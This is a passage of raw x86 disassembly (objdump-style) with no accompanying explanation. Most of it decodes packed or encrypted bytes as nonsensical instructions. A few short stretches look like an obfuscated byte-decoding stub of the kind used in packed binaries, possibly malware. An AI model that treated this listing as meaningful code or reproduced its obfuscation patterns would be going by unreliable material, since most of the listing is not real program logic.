  4039cb:	sub    edx,0x984b9f8
  4039d1:	pusha  
  4039d2:	adc    DWORD PTR [edx+esi*8+0x7ea3c173],eax
  4039d9:	jo     0x403a18
  4039db:	lea    esp,[ebx+esi*4]
  4039de:	aad    0xe8
  4039e0:	js     0x403a35
  4039e2:	fsubr  QWORD PTR [ebx-0x28]
  4039e5:	cmp    dl,BYTE PTR [ecx]
  4039e7:	aaa    
  4039e8:	enter  0x2a8b,0x4f
  4039ec:	scas   eax,DWORD PTR es:[edi]
  4039ed:	ret    0x255b
  4039f0:	xchg   ebx,eax
  4039f1:	retf   
  4039f2:	clc    
  4039f3:	xor    DWORD PTR [ebp-0x3bdb09a5],edi
  4039f9:	lea    ebx,[edi-0x47]
  4039fc:	xchg   ebp,eax
  4039fd:	icebp  
  4039fe:	cld    
  4039ff:	rcl    ebp,cl
  403a01:	mov    dh,0xc5
  403a03:	mov    ch,0x5b
  403a05:	push   ds
  403a06:	ins    BYTE PTR es:[edi],dx
  403a07:	add    bh,BYTE PTR [esi]
  403a09:	stc    
  403a0a:	sbb    DWORD PTR [edi-0x57],0xffffffdc
  403a0e:	dec    ebp
  403a0f:	rol    BYTE PTR [ecx-0x3f],0x46
  403a13:	cwde   
  403a14:	xchg   edi,eax
  403a15:	mov    DWORD PTR [edx+0x1553d608],ebx
  403a1b:	and    al,0x2a
  403a1d:	jmp    0x51d7:0xb357790
  403a24:	xchg   ebx,eax
  403a25:	inc    ebx
  403a26:	or     ebp,DWORD PTR [edx]
  403a28:	rcr    DWORD PTR [ecx+0xa73e9fb],cl
  403a2e:	shr    BYTE PTR [eax+eax*2+0xa],1
  403a32:	push   eax
  403a33:	fadd   DWORD PTR [edi-0x30]
  403a36:	int3   
  403a37:	test   eax,0xb564ddf6
  403a3c:	test   eax,0x8191c011
  403a41:	stos   BYTE PTR es:[edi],al
  403a42:	sbb    DWORD PTR [ecx-0x2690acb3],esp
  403a48:	leave  
  403a49:	pop    ebx
  403a4a:	add    DWORD PTR [edi],esp
  403a4c:	sti    
  403a4d:	sbb    bh,BYTE PTR [edi+0x35bea0f6]
  403a53:	int    0xf4
  403a55:	aam    0x6a
  403a57:	dec    esp
  403a58:	clc    
  403a59:	pop    edx
  403a5a:	pop    ebx
  403a5b:	pusha  
  403a5c:	jmp    0x7ea4:0x1bb813e5
  403a63:	sbb    ebx,ecx
  403a65:	loope  0x403a93
  403a67:	push   cs
  403a68:	dec    ebx
  403a69:	(bad)
  403a6c:	out    dx,eax
  403a6d:	dec    edi
  403a6e:	push   eax
  403a6f:	mov    esp,0x102eb0eb
  403a74:	cmp    ecx,DWORD PTR [esi-0x2382dfbe]
  403a7a:	js     0x403ac8
  403a7c:	int    0xa1
  403a7e:	dec    esi
  403a7f:	push   edi
  403a80:	jnp    0x403ab3
  403a82:	cdq    
  403a83:	sub    ch,BYTE PTR [edx+0x33]
  403a86:	(bad)  
  403a87:	shl    BYTE PTR [ebx+edx*1],0xe7
  403a8b:	sbb    ebx,DWORD PTR [edi-0x447fad19]
  403a91:	ret    0xe215
  403a94:	jp     0x403a66
  403a96:	pop    ds
  403a97:	inc    ebx
  403a98:	add    bh,dh
  403a9a:	mov    ebx,0x9b89a88f
  403a9f:	sub    dl,BYTE PTR [ebp-0x68fa6be6]
  403aa5:	xlat   BYTE PTR ds:[ebx]
  403aa6:	imul   ebp,DWORD PTR [eax+0x4cd426e7],0x15fdce56
  403ab0:	jecxz  0x403a97
  403ab2:	cdq    
  403ab3:	adc    BYTE PTR [edx-0x2ff3ac68],cl
  403ab9:	mov    ecx,0x950c2d76
  403abe:	mov    bh,0xca
  403ac0:	pop    ss
  403ac1:	mov    cl,0xbe
  403ac3:	cmp    eax,0x7230bd4a
  403ac8:	fs mov ebx,0x10b6fd15
  403ace:	mov    dl,0x64
  403ad0:	mov    ebx,DWORD PTR [esi]
  403ad2:	sbb    BYTE PTR [ebp-0x4c141e62],bh
  403ad8:	mov    dh,0x9d
  403ada:	and    BYTE PTR [edx],0x8e
  403add:	xor    DWORD PTR [ebx+eax*4+0x10],esi
  403ae1:	and    esp,ecx
  403ae3:	out    0xdb,al
  403ae5:	add    BYTE PTR [ecx+0x1b],cl
  403ae8:	mov    ds:0xe522b06f,al
  403aed:	sub    esi,DWORD PTR [edi-0xba7540]
  403af3:	movzx  ecx,WORD PTR ds:0x42e7eb
  403afa:	adc    DWORD PTR ds:0x42fe76,ecx
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e224,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fdfd,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fdf5
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx-0x424fc69],esi
  403b3e:	sbb    ebp,eax
  403b40:	push   ds
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0xd570707d
  403b48:	mov    al,0x8e
  403b4a:	mov    ebp,0x3aac58e2
  403b4f:	jbe    0x403b85
  403b51:	daa    
  403b52:	adc    al,0x62
  403b54:	add    cl,cl
  403b56:	cmp    eax,DWORD PTR [ebp+0xd9ae25d]
  403b5c:	mov    ecx,DWORD PTR [ebx]
  403b5e:	cs jl  0x403b65
  403b61:	pop    edi
  403b62:	or     dl,BYTE PTR [ebp-0x1b]
  403b65:	leave  
  403b66:	stos   DWORD PTR es:[edi],eax
  403b67:	iret   
  403b68:	mov    ecx,esi
  403b6a:	inc    edi
  403b6b:	(bad)  
  403b6c:	in     al,dx
  403b6d:	adc    ebp,0xfe007a62
  403b73:	scas   eax,DWORD PTR es:[edi]
  403b74:	repnz call 0x9a3d:0x16d9631a
  403b7c:	call   0x4853:0x4087d8a4
  403b83:	les    edx,FWORD PTR [ebx+edi*2]
  403b86:	mov    edx,0x96a1a7b0
  403b8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b8c:	(bad)  
  403b8d:	in     al,0xca
  403b8f:	les    edi,FWORD PTR [ebp+0x4b]
  403b92:	ins    DWORD PTR es:[edi],dx
  403b93:	xchg   esi,eax
  403b94:	retf   0x5d04
  403b97:	cdq    
  403b98:	pop    edx
  403b99:	icebp  
  403b9a:	pusha  
  403b9b:	data16 add BYTE PTR [esi-0x29],0xfc
  403ba0:	ds push ss
  403ba2:	or     al,0xd3
  403ba4:	jp     0x403b4e
  403ba6:	js     0x403be7
  403ba8:	mov    ebx,0x8771a996
  403bad:	es mov ecx,0x727b51b4
  403bb3:	add    esi,DWORD PTR [edx+0x71]
  403bb6:	fild   DWORD PTR [ebp+0x57fc6128]
  403bbc:	icebp  
  403bbd:	inc    ebp
  403bbe:	jle    0x403bd8
  403bc0:	sbb    edi,ebx
  403bc2:	lds    edx,FWORD PTR [ecx-0x6]
  403bc5:	test   BYTE PTR [edi-0x15],0x86
  403bc9:	loopne 0x403c43
  403bcb:	xchg   ebx,eax
  403bcc:	loope  0x403b60
  403bce:	cmc    
  403bcf:	(bad)  
  403bd0:	sub    al,0x71
  403bd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bd3:	sar    BYTE PTR [eax-0x59],0x46
  403bd7:	xor    al,0xa4
  403bd9:	arpl   WORD PTR [eax-0x44558975],sp
  403bdf:	jp     0x403b70
  403be1:	mov    cl,bh
  403be3:	pop    ss
  403be4:	retf   0xc924
  403be7:	std    
  403be8:	sub    BYTE PTR [ecx],dl
  403bea:	dec    esp
  403beb:	rcl    BYTE PTR [esi],0xdd
  403bee:	ret    
  403bef:	jmp    FWORD PTR [ebp+0x5]
  403bf2:	loope  0x403c49
  403bf4:	retf   
  403bf5:	mov    ch,0xd1
  403bf7:	stos   DWORD PTR es:[edi],eax
  403bf8:	sar    DWORD PTR [ebx+eax*2-0x17],0x23
  403bfd:	dec    ecx
  403bfe:	enter  0x2a83,0x88
  403c02:	addr16 push ebx
  403c04:	div    ebx
  403c06:	mov    eax,0x49bde28
  403c0b:	cmp    ebp,edx
  403c0d:	mov    edx,esp
  403c0f:	add    edi,DWORD PTR [edx+0x4068c804]
  403c15:	mov    BYTE PTR [esi],cl
  403c17:	and    al,BYTE PTR [ebx]
  403c19:	leave  
  403c1a:	inc    esi
  403c1b:	pop    esi
  403c1c:	pop    edi
  403c1d:	mov    ecx,0xf3799720
  403c22:	push   edi
  403c23:	(bad)  
  403c24:	test   ebx,0xde0e2c6e
  403c2a:	mov    BYTE PTR [ebp-0x56],dh
  403c2d:	dec    edx
  403c2e:	mov    al,ds:0x1c2b689a
  403c33:	iret   
  403c34:	push   edi
  403c35:	int    0xca
  403c37:	lods   al,BYTE PTR ds:[esi]
  403c38:	push   edi
  403c39:	nop
  403c3a:	(bad)  
  403c3b:	(bad)  
  403c3c:	aaa    
  403c3d:	shl    ebp,1
  403c3f:	das    
  403c40:	cmp    BYTE PTR es:[ebx-0x4a],dl
  403c44:	jmp    0xe4996a9e
  403c49:	out    0x99,al
  403c4b:	(bad)
  403c4f:	cmp    eax,DWORD PTR [ebp+0x1a8ffe42]
  403c55:	jbe    0x403c41
  403c57:	push   esi
  403c58:	jl     0x403c57
  403c5a:	add    dh,bh
  403c5c:	jmp    0x88c2:0xbe5bbb78
  403c63:	sub    bl,BYTE PTR [ebp+0x7e]
  403c66:	js     0x403ccf
  403c68:	pop    ds
  403c69:	arpl   ax,di
  403c6b:	loop   0x403cc2
  403c6d:	rcl    bh,0x19
  403c70:	dec    edx
  403c71:	test   edx,0xbee15592
  403c77:	sahf   
  403c78:	xor    BYTE PTR [esi-0x4],al
  403c7b:	jle    0x403c64
  403c7d:	sbb    DWORD PTR [ebx-0x42ece737],edx
  403c83:	rol    ebx,0xdf
  403c86:	adc    dh,cl
  403c88:	dec    ebp
  403c89:	sub    al,0x68
  403c8b:	cli    
  403c8c:	add    DWORD PTR [ecx-0x20],ebx
  403c8f:	daa    
  403c90:	outs   dx,DWORD PTR ds:[esi]
  403c91:	jbe    0x403d07
  403c93:	iret   
  403c94:	enter  0xa4b1,0x7a
  403c98:	rcl    edi,cl
  403c9a:	fimul  WORD PTR [ecx]
  403c9c:	in     eax,dx
  403c9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c9e:	fs adc eax,0xc5d882a8
  403ca4:	mov    ds,WORD PTR [eax-0x7a]
  403ca7:	scas   eax,DWORD PTR es:[edi]
  403ca8:	ret    0x5d7e
  403cab:	mov    ds:0xbd434297,al
  403cb0:	mov    dl,0x30
  403cb2:	adc    BYTE PTR [ebp+0x271f7489],bh
  403cb8:	dec    ecx
  403cb9:	pop    eax
  403cba:	test   DWORD PTR [ecx+edi*2-0x10],ecx
  403cbe:	cs nop
  403cc0:	dec    esi
  403cc1:	(bad)  
  403cc2:	cwde   
  403cc3:	hlt    
  403cc4:	leave  
  403cc5:	mov    ch,0xad
  403cc7:	(bad)  
  403cc8:	out    0xa3,eax
  403cca:	inc    edi
  403ccb:	push   ds
  403ccc:	in     eax,0x92
  403cce:	test   dl,ah
  403cd0:	inc    ebx
  403cd1:	adc    eax,0xaaa13ad8
  403cd6:	js     0x403d43
  403cd8:	ds mov ah,0x41
  403cdb:	dec    ebp
  403cdc:	cmp    bh,BYTE PTR [ecx]
  403cde:	hlt    
  403cdf:	outs   dx,BYTE PTR ds:[esi]
  403ce0:	sti    
  403ce1:	nop
  403ce2:	leave  
  403ce3:	retf   
  403ce4:	mov    dl,dh
  403ce6:	or     DWORD PTR [ebx+ebp*4],0x6c50d5c6
  403ced:	sbb    eax,0xc4f43786
  403cf2:	jae    0x403c96
  403cf4:	cwde   
  403cf5:	add    DWORD PTR [esi+edx*4],ebx
  403cf8:	mov    esi,0x288b5d90
  403cfd:	into   
  403cfe:	nop
  403cff:	inc    edx
  403d00:	lods   al,BYTE PTR ds:[esi]
  403d01:	aas    
  403d02:	mov    ebx,0xa65081f8
  403d07:	jmp    0xd733cbb7
  403d0c:	lock inc ebp
  403d0e:	mov    eax,0x43c5f60
  403d13:	and    edi,DWORD PTR [ecx-0xd]
  403d16:	in     al,dx
  403d17:	or     BYTE PTR [ecx],0xf6
  403d1a:	or     edi,eax
  403d1c:	inc    edi
  403d1d:	adc    al,bh
  403d1f:	push   ebx
  403d20:	ds pop edx
  403d22:	das    
  403d23:	jne    0x403cb7
  403d25:	push   0x5d
  403d27:	jl     0x403d87
  403d29:	fs xchg ebx,eax
  403d2b:	(bad)  
  403d2c:	not    bh
  403d2e:	shr    DWORD PTR [ebp-0x68],1
  403d31:	loop   0x403cf3
  403d33:	lds    esp,FWORD PTR ds:0xf78b0d77
  403d39:	push   es
  403d3a:	rcl    cl,cl
  403d3c:	out    0xb5,eax
  403d3e:	fsubr  QWORD PTR [ebx]
  403d40:	xor    DWORD PTR [ebx+0xd],0x181a07a4
  403d47:	adc    BYTE PTR ds:0xfd946f43,0x29
  403d4e:	call   0xf8e9:0x524dc6bf
  403d55:	lods   al,BYTE PTR ds:[esi]
  403d56:	or     edi,DWORD PTR [ecx]
  403d58:	dec    esp
  403d59:	int    0x32
  403d5b:	stos   DWORD PTR es:[edi],eax
  403d5c:	cmp    DWORD PTR [edx+0x7c828df0],ebx
  403d62:	repz test BYTE PTR [ebx+edx*2-0x5d],dh
  403d67:	mov    al,0x54
  403d69:	jmp    0xc898f811
  403d6e:	imul   edi,DWORD PTR [ebx],0xeea69edf
  403d74:	in     al,dx
  403d75:	inc    eax
  403d76:	(bad)  
  403d77:	shl    DWORD PTR [ecx-0x789bac5b],cl
  403d7d:	push   ebx
  403d7e:	rep lods eax,DWORD PTR ds:[esi]
  403d80:	jae    0x403d92
  403d82:	not    DWORD PTR [esi+edi*2+0x5]
  403d86:	push   edi
  403d87:	scas   eax,DWORD PTR es:[edi]
  403d88:	mov    edx,0xc9fb8c57
  403d8d:	xchg   esp,eax
  403d8e:	add    edi,DWORD PTR [eax+ecx*4-0x396fb2b4]
  403d95:	je     0x403d27
  403d97:	out    dx,al
  403d98:	(bad)  [eax]
  403d9a:	cmp    al,0x3c
  403d9c:	push   cs
  403d9d:	mov    dh,0xd8
  403d9f:	xchg   BYTE PTR [esi+0x37db846b],bl
  403da5:	mov    ebp,0xff2ba68c
  403daa:	sbb    DWORD PTR [edx],esp
  403dac:	out    0x13,eax
  403dae:	add    al,0x94
  403db0:	fsubr  DWORD PTR [esi+0x6aa6157e]
  403db6:	cmp    esi,esp
  403db8:	mov    DWORD PTR [ecx+0x60],ecx
  403dbb:	mov    edx,edi
  403dbd:	cmp    cl,BYTE PTR [edi+0x35ebeabe]
  403dc3:	jnp    0x403e01
  403dc5:	xchg   esi,eax
  403dc6:	shl    BYTE PTR [edx+0x62966563],0xe9
  403dcd:	(bad)  
  403dce:	push   eax
  403dcf:	or     BYTE PTR [ebp+0x1a],bl
  403dd2:	jle    0x403e1c
  403dd4:	dec    ecx
  403dd5:	push   esi
  403dd6:	inc    esp
  403dd7:	in     eax,dx
  403dd8:	clc    
  403dd9:	ins    BYTE PTR es:[edi],dx
  403dda:	mov    ch,BYTE PTR [eax-0x382dc420]
  403de0:	fild   DWORD PTR [edi]
  403de2:	out    0x71,eax
  403de4:	sub    eax,0x14c55476
  403de9:	outs   dx,DWORD PTR ds:[esi]
  403dea:	sub    BYTE PTR [eax],ah
  403dec:	fistp  QWORD PTR [esi+0x5f]
  403def:	xor    ch,BYTE PTR ds:0xf88422dc
  403df5:	sbb    DWORD PTR [eax],eax
  403df7:	nop
  403df8:	pop    edx
  403df9:	push   ss
  403dfa:	jbe    0x403dde
  403dfc:	xor    eax,DWORD PTR [ebp+0x62356259]
  403e02:	fistp  DWORD PTR [eax]
  403e04:	push   0xfffffff7
  403e06:	ror    DWORD PTR ds:0x74d74d7,0xae
  403e0d:	imul   edx,DWORD PTR [edx-0x1],0x64579b02
  403e14:	mov    ecx,0x225db37d
  403e19:	lods   eax,DWORD PTR ds:[esi]
  403e1a:	(bad)  
  403e1b:	data16 ss arpl bp,dx
  403e1f:	not    dh
  403e21:	sbb    BYTE PTR [ebx+0x610410fa],bh
  403e27:	inc    ecx
  403e28:	jmp    0x8e705057
  403e2d:	push   es
  403e2e:	push   ds
  403e2f:	mov    cs,WORD PTR [ebp-0x298993aa]
  403e35:	in     eax,0xbe
  403e37:	rcr    BYTE PTR [ebx-0x5176b069],0x10
  403e3e:	es pusha 
  403e40:	or     al,0x5e
  403e42:	mov    BYTE PTR [eax+0x17e8ad03],cl
  403e48:	inc    ecx
  403e49:	inc    edx
  403e4a:	fwait
  403e4b:	leave  
  403e4c:	mul    cl
  403e4e:	lock mov ds:0xfd754d6c,al
  403e54:	inc    esi
  403e55:	or     esi,ebx
  403e57:	xor    ebx,edi
  403e59:	ja     0x403e0f
  403e5b:	outs   dx,BYTE PTR ds:[esi]
  403e5c:	rcr    DWORD PTR [ecx+0x22],cl
  403e5f:	push   0x9
  403e61:	ds mov esp,0x26a1cab7
  403e67:	sub    dh,BYTE PTR [ebp+0x1a557d65]
  403e6d:	bound  edi,QWORD PTR [esi+ecx*4+0x537138c0]
  403e74:	sub    eax,0x21813242
  403e79:	and    al,0xa3
  403e7b:	jae    0x403e29
  403e7d:	std    
  403e7e:	xchg   ecx,eax
  403e7f:	xor    DWORD PTR [eax+0x338373a2],ecx
  403e85:	(bad)  
  403e86:	and    BYTE PTR ds:[esi+ebx*1],cl
  403e8a:	mov    DWORD PTR [ebp-0x10],0xf89c8530
  403e91:	mov    eax,DWORD PTR [ebp-0x8]
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e21c
  403ea2:	adc    DWORD PTR ds:0x42e80f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fe72,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fe05,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e7ef,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x51781c35
  403eec:	imul   eax,DWORD PTR [edx+eax*4],0x3d70701b
  403ef3:	jge    0x403f65
  403ef5:	jo     0x403ec1
  403ef7:	jl     0x403ede
  403ef9:	mul    BYTE PTR [ebp-0x50825636]
  403eff:	into   
  403f00:	mov    esp,0xaade4e5d
  403f05:	iret   
  403f06:	(bad)  
  403f07:	xchg   ebx,eax
  403f08:	stc    
  403f09:	add    BYTE PTR [eax-0x53170e88],0x8d
  403f10:	test   al,0xa5
  403f12:	cmp    eax,0x6e0588c
  403f17:	push   0x755a89ff
  403f1c:	jo     0x403ed8
  403f1e:	mov    edx,0x894bcaf1
  403f23:	and    BYTE PTR [ecx+0x2a],dh
  403f26:	or     ah,BYTE PTR [edi-0x3e54c0b2]
  403f2c:	hlt    
  403f2d:	idiv   DWORD PTR [ecx+0x256ed762]
  403f33:	pop    edi
  403f34:	div    DWORD PTR [ebx]
  403f36:	loop   0x403f5c
  403f38:	jns    0x403efa
  403f3a:	cmp    eax,0xbf59d8a2
  403f3f:	loope  0x403f97
  403f41:	call   FWORD PTR [ecx+ebx*4+0x28]
  403f45:	jmp    0x403fa5
  403f47:	cmc    
  403f48:	and    DWORD PTR [eax+0x11],0xfffffffc
  403f4c:	mov    ebp,0x254d2af8
  403f51:	cmp    cl,BYTE PTR [esi+ebx*2+0x2dc72390]
  403f58:	ror    edx,cl
  403f5a:	enter  0x1c73,0x2e
  403f5e:	sbb    ebp,edi
  403f60:	aam    0x19
  403f62:	or     BYTE PTR [ebp+0x77],bh
  403f65:	push   ds
  403f66:	ins    BYTE PTR es:[edi],dx
  403f67:	pushf  
  403f68:	mov    dl,0xca
  403f6a:	push   0x7d0766
  403f6f:	out    dx,al
  403f70:	enter  0x839d,0x81
  403f74:	sub    ecx,ecx
  403f76:	dec    esp
  403f77:	retf   
  403f78:	clc    
  403f79:	(bad)  
  403f7a:	xor    BYTE PTR [ebp-0x27e1492b],cl
  403f80:	loope  0x403f8f
  403f82:	or     BYTE PTR [ebp+0x3],ch
  403f85:	sub    eax,0xbe021466
  403f8a:	jnp    0x403fac
  403f8c:	pop    eax
  403f8d:	jmp    0x6e7f3349
  403f92:	dec    ecx
  403f93:	cmp    cl,BYTE PTR [eax-0x1501ae1e]
  403f99:	rcl    BYTE PTR ss:[bp+0x51],1
  403f9e:	jge    0x404002
  403fa0:	pop    edx
  403fa1:	mov    ch,0xc6
  403fa3:	push   eax
  403fa4:	lods   eax,DWORD PTR ds:[esi]
  403fa5:	mov    eax,0x280d7a28
  403faa:	mov    eax,0x420f9962
  403faf:	xor    al,0xf5
  403fb1:	pop    ss
  403fb2:	xor    ecx,DWORD PTR [ebp+0x5af991fb]
  403fb8:	and    ch,cl
  403fba:	push   cs
  403fbb:	dec    edx
  403fbc:	or     BYTE PTR [edx-0x56],dl
  403fbf:	pop    eax
  403fc0:	or     al,0xa4
  403fc2:	leave  
  403fc3:	xchg   esp,eax
  403fc4:	or     eax,0xd96d3da
  403fc9:	test   eax,0xafef2039
  403fce:	shr    BYTE PTR [eax],0xe6
  403fd1:	imul   ebx,DWORD PTR [ebx],0xa54cecca
  403fd7:	out    dx,al
  403fd8:	push   eax
  403fd9:	jge    0x403f92
  403fdb:	cmp    al,ch
  403fdd:	lds    eax,FWORD PTR [esi]
  403fdf:	test   BYTE PTR [ecx],0xf4
  403fe2:	cli    
  403fe3:	inc    ebp
  403fe4:	(bad)  
  403fe5:	popa   
  403fe6:	dec    ebx
  403fe7:	jmp    0x403fa1
  403fe9:	gs pop ebx
  403feb:	add    edx,esp
  403fed:	(bad)  
  403fee:	inc    edi
  403fef:	shl    BYTE PTR [esi+0x63],cl
  403ff2:	mov    ebx,0x1d0a5acd
  403ff7:	mov    al,ds:0x37d266b2
  403ffc:	clc    
  403ffd:	xor    eax,0x521a63a7
  404002:	mov    cl,0x25
  404004:	push   ss
  404005:	repz push ebx
  404007:	add    eax,0x8fac2616
  40400c:	mov    edx,DWORD PTR [esi+0x63a52ce9]
  404012:	mov    ss,WORD PTR [esi]
  404014:	repnz inc ebp
  404016:	adc    eax,0xe08b3d61
  40401b:	jmp    0x404063
  40401d:	pushf  
  40401e:	push   cs
  40401f:	inc    edi
  404020:	bsf    ecx,DWORD PTR [edi]
  404023:	jns    0x404049
  404025:	pop    ss
  404026:	xchg   edx,eax
  404027:	push   ss
  404028:	imul   edx,DWORD PTR [esi-0x57],0xffffffa9
  40402c:	and    BYTE PTR [eax+eiz*2-0x13bc9aeb],bl
  404033:	jg     0x403fc2
  404035:	xchg   ebp,eax
  404036:	(bad)  [edx-0x5e]
  404039:	inc    edx
  40403a:	popa   
  40403b:	aad    0x11
  40403d:	pop    ebp
  40403e:	jle    0x403fe8
  404040:	mov    al,0x40
  404042:	rol    DWORD PTR [edx],1
  404044:	repz push esi
  404046:	(bad)  
  404047:	jge    0x40402f
  404049:	push   ecx
  40404a:	cwde   
  40404b:	xor    DWORD PTR gs:[ecx],0xffffff91
  40404f:	outs   dx,DWORD PTR ds:[esi]
  404050:	ins    DWORD PTR es:[edi],dx
  404051:	inc    esp
  404052:	jmp    0xa5c10a2e
  404057:	das    
  404058:	or     ebx,DWORD PTR [edi]
  40405a:	sub    ebx,ecx
  40405c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40405d:	stos   DWORD PTR es:[edi],eax
  40405e:	dec    eax
  40405f:	dec    eax
  404060:	arpl   WORD PTR [edx],dx
  404062:	xchg   edi,eax
  404063:	jg     0x404058
  404065:	lds    esp,FWORD PTR [ebp+esi*1-0x24ffe28]
  40406c:	fsub   QWORD PTR [ebp+0x41f4713b]
  404072:	mov    bh,0xf3
  404074:	sub    DWORD PTR [ecx+0x72],esp
  404077:	mov    edx,eax
  404079:	push   ss
  40407a:	adc    BYTE PTR [ecx-0x42],cl
  40407d:	pop    eax
  40407e:	adc    al,0x9a
  404080:	xchg   edi,eax
  404081:	mov    bh,0x5
  404083:	mov    ah,0xd5
  404085:	test   eax,0xe235c024
  40408a:	mov    ebx,0x92598f8
  40408f:	icebp  
  404090:	sbb    BYTE PTR gs:[edi+0x26fd87dd],bl
  404097:	sbb    BYTE PTR [esi-0x57],bh
  40409a:	sbb    dl,dl
  40409c:	push   esi
  40409d:	scas   eax,DWORD PTR es:[edi]
  40409e:	push   ecx
  40409f:	mov    esp,0x5e15d932
  4040a4:	and    ah,BYTE PTR [ebx]
  4040a6:	lea    esp,[eax+edi*4-0x55]
  4040aa:	sub    DWORD PTR [ecx-0x5ddb036a],ebx
  4040b0:	mov    ebp,DWORD PTR [ebp+0x357ccf06]
  4040b6:	jmp    0xcc47:0xefbeacc2
  4040bd:	push   ebx
  4040be:	aam    0x15
  4040c0:	loope  0x4040db
  4040c2:	(bad)  
  4040c3:	stos   BYTE PTR es:[edi],al
  4040c4:	add    DWORD PTR [ebp+0x3ce7a9a0],0x40
  4040cb:	mov    ebp,0xa6ef7c4c
  4040d0:	jp     0x404082
  4040d2:	clc    
  4040d3:	cld    
  4040d4:	xlat   BYTE PTR ds:[ebx]
  4040d5:	cmp    BYTE PTR [eax*4-0xb0c5959],cl
  4040dc:	xor    al,0x13
  4040de:	test   BYTE PTR [edx],0xa5
  4040e1:	push   ebx
  4040e2:	retf   
  4040e3:	imul   edx,DWORD PTR [edx],0xfa1968c1
  4040e9:	sbb    eax,0x91e1278a
  4040ee:	pop    esi
  4040ef:	(bad)  
  4040f0:	jl     0x404131
  4040f2:	mov    bl,0x70
  4040f4:	xlat   BYTE PTR ds:[ebx]
  4040f5:	loope  0x404135
  4040f7:	mov    ecx,0xe6ada52c
  4040fc:	inc    edx
  4040fd:	jmp    0x1154042f
  404102:	retf   
  404103:	jl     0x404148
  404105:	pop    es
  404106:	ror    BYTE PTR [edx-0x21d11376],1
  40410c:	and    al,0x8f
  40410e:	int3   
  40410f:	cli    
  404110:	into   
  404111:	pop    ecx
  404112:	stos   BYTE PTR es:[edi],al
  404113:	test   DWORD PTR [edi-0x79a9369e],0x12dbda0a
  40411d:	jmp    0x3c3:0x74a36966
  404124:	push   ebp
  404125:	mov    esp,0x646216bb
  40412a:	push   es
  40412b:	(bad)  
  40412c:	jecxz  0x404181
  40412e:	xor    eax,0x933ed9a7
  404133:	adc    esi,ecx
  404135:	push   ebp
  404136:	clc    
  404137:	mov    edx,esi
  404139:	out    dx,al
  40413a:	push   edx
  40413b:	hlt    
  40413c:	retf   0x10c2
  40413f:	ins    DWORD PTR es:[edi],dx
  404140:	adc    al,0x71
  404142:	pavgb  mm6,QWORD PTR [edi+ebp*2]
  404146:	pop    esi
  404147:	dec    edx
  404148:	pop    es
  404149:	cld    
  40414a:	sbb    DWORD PTR [ebx],ebp
  40414c:	adc    al,0xfa
  40414e:	jmp    0xf18e:0x1a72
  404154:	test   al,0x17
  404156:	jmp    0x404148
  404158:	pop    esp
  404159:	scas   eax,DWORD PTR es:[edi]
  40415a:	lods   al,BYTE PTR ds:[esi]
  40415b:	xor    esi,ecx
  40415d:	mov    gs,WORD PTR ds:0x5f125faf
  404163:	leave  
  404164:	call   0xf3839949
  404169:	pop    ss
  40416a:	std    
  40416b:	xchg   ebp,eax
  40416c:	jb     0x4040f8
  40416e:	xchg   BYTE PTR [ebx-0x132ab013],cl
  404174:	cmp    BYTE PTR [eax],dh
  404176:	test   eax,0x763ba68e
  40417b:	mov    ds:0x3471edab,eax
  404180:	xchg   esi,esp
  404182:	mov    al,ds:0xd527cfaa
  404187:	push   eax
  404188:	lock sub BYTE PTR [ecx-0x14],cl
  40418c:	shl    DWORD PTR [ebx-0x70bcc003],0xc4
  404193:	fimul  DWORD PTR [edx*8+0x200c8181]
  40419a:	imul   ecx,DWORD PTR ds:0x2fc27572,0xcedba2f8
  4041a4:	cs std 
  4041a6:	stc    
  4041a7:	lfs    eax,FWORD PTR ds:0xe2c03761
  4041ae:	push   esi
  4041af:	pop    ss
  4041b0:	in     al,dx
  4041b1:	mov    esp,0xba8f5e1e
  4041b6:	les    ebx,FWORD PTR [ecx+0x27]
  4041b9:	xchg   bp,ax
  4041bb:	lock mov ebp,0x2e938231
  4041c1:	pop    eax
  4041c2:	fist   DWORD PTR [edx]
  4041c4:	push   ss
  4041c5:	adc    al,0xc2
  4041c7:	popf   
  4041c8:	inc    edx
  4041c9:	pop    esp
  4041ca:	retf   0x52ba
  4041cd:	adc    DWORD PTR [esi],ebp
  4041cf:	popf   
  4041d0:	dec    ebx
  4041d1:	fstp   TBYTE PTR [ebx]
  4041d3:	test   BYTE PTR [edx+0x1c812098],bl
  4041d9:	and    ebx,DWORD PTR [ecx-0x129c43d7]
  4041df:	lods   eax,DWORD PTR ds:[esi]
  4041e0:	xchg   ebx,eax
  4041e1:	imul   BYTE PTR ss:[ecx-0x2b]
  4041e5:	repz retf 
  4041e7:	mov    ecx,ss
  4041e9:	es fwait
  4041eb:	lock push ss
  4041ed:	cmp    eax,esp
  4041ef:	push   0x62
  4041f1:	iret   
  4041f2:	int3   
  4041f3:	loopne 0x40421f
  4041f5:	cmp    BYTE PTR [ebp+0x77d4eaff],ah
  4041fb:	jne    0x404237
  4041fd:	ror    DWORD PTR [edx],cl
